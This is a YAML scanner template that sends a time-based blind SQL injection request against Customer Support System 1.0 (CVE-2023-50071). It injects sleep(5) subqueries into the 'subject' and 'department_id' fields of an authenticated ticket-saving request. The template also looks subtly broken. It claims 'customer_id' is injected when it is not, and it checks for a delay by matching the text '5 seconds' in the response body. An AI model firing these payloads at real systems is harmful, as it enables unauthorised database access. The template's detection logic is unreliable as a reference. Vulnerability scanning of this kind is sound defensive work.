id: customer-support-system-sql-injection

info:
  name: Customer Support System 1.0 - SQL Injection
  author: Zierax
  severity: high
  tags: sql-injection, authenticated
  description: |
    This template exploits multiple SQL injection vulnerabilities in Customer Support System 1.0, allowing an authenticated user to execute arbitrary SQL commands via the `department_id`, `customer_id`, and `subject` parameters.
  references:
    - https://www.sourcecodester.com/php/14587/customer-support-system-using-phpmysqli-source-code.html
  date: 2024-11-5
  cve: CVE-2023-50071
  software:
    name: Customer Support System
    version: 1.0

requests:
  - method: POST
    path:
      - "{{BaseURL}}/customer_support/ajax.php?action=save_ticket"

    body: |
      -----------------------------81419250823331111993422505835
      Content-Disposition: form-data; name="id"
      
      -----------------------------81419250823331111993422505835
      Content-Disposition: form-data; name="subject"

      teste'+(select*from(select(sleep(5)))a)+'
      -----------------------------81419250823331111993422505835
      Content-Disposition: form-data; name="customer_id"

      3
      -----------------------------81419250823331111993422505835
      Content-Disposition: form-data; name="department_id"

      4'+(select*from(select(sleep(5)))a)+'
      -----------------------------81419250823331111993422505835
      Content-Disposition: form-data; name="description"

      <p>Blahs<br></p>
      -----------------------------81419250823331111993422505835
      Content-Disposition: form-data; name="files"; filename=""
      Content-Type: application/octet-stream

      -----------------------------81419250823331111993422505835--

    headers:
      Content-Type: multipart/form-data; boundary=---------------------------81419250823331111993422505835
      X-Requested-With: XMLHttpRequest
      Cookie: "csrftoken={{csrf_token}}; sessionid={{session_id}}; PHPSESSID={{phpsessid}}"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "5 seconds"  # Adjust this if the response contains timing information or if a delay indicates successful injection

      - type: word
        words:
          - "new_ticket"  # Expected content indicating the ticket submission was accepted
        part: body
